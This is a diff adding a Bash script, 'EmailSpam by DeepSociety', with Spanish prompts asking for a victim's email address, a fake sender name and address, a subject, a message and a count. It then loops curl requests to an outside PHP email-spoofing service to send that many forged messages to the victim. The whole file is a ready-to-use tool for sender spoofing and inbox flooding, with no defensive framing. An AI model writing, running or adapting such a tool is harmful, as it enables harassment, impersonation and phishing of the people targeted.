@@ -1,0 +1,65 @@
+
+trap vye EXIT
+v="\e[1;92m"
+r="\e[1;91m"
+b="\e[1;39m"
+x="$v[$b*$v]$b"
+a="\e[1;93m"
+
+banner(){
+clear
+echo -e "\e[1;92m
+___________              .__.__   
+\_   _____/ _____ _____  |__|  | 
+ |     __)_ /     \\__  \ |  |  |  
+ |        \  Y Y  \/ __ \|  |  |__
+/_______  /__|_|  (____  /__|____/
+        \/      \/     \/
+  _________
+ /   _____/__________    _____    
+ \_____   \\____ \__  \  /     \   
+ /        \  |_> > __ \|  Y Y  \  
+/_______  /   __(____  /__|_|  /  
+        \/|__|       \/      \/   
+\n$a[$b*$a]$b Create by DeepSociety $a[$b*$a]
+$a[$b*$a]$b https://github.com/DeepSociety $a[$b*$a]
+"
+}
+
+vye(){
+echo -e "\n$x EmailSpam by DeepSociety
+$x https://github.com/DeepSociety/EmailSpam"
+}
+
+menu(){
+banner
+echo -e "$x Correo de la victima:"
+read -p ">> " victima
+echo -e "$x Nombre falso:"
+read -p ">> " name
+echo -e "$x Asunto:"
+read -p ">> " asunto
+echo -e "$x Correo falso:"
+read -p ">> " falso
+echo -e "$x Mensaje:"
+read -p ">> " msj
+echo -e "$x Cantidad de mensajes;"
+read -p ">> " int
+for ((xd = 1; xd<=$int; xd++));do
+curl --data "fromname=$name && fromemail=$falso && replyname=$name && replyemail=$falso && to=$victima && message=$msj && subject=$asunto" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
+if [[ -f spoof ]];then
+grp_msj=$(grep -o "Successfully" spoof)
+if [[ $grp_msj == "Successfully" ]];then
+echo -e "$v[$b*$v]$b Email $xd enviado correctamente"
+rm spoof
+else
+echo -e "$n[$b*$n]$b No se envio el email $xd"
+rm spoof
+fi
+else
+echo -e "$r[!]$b No se envio el email $xd, comprueba tu conexión"
+fi
+done
+}
+
+menu
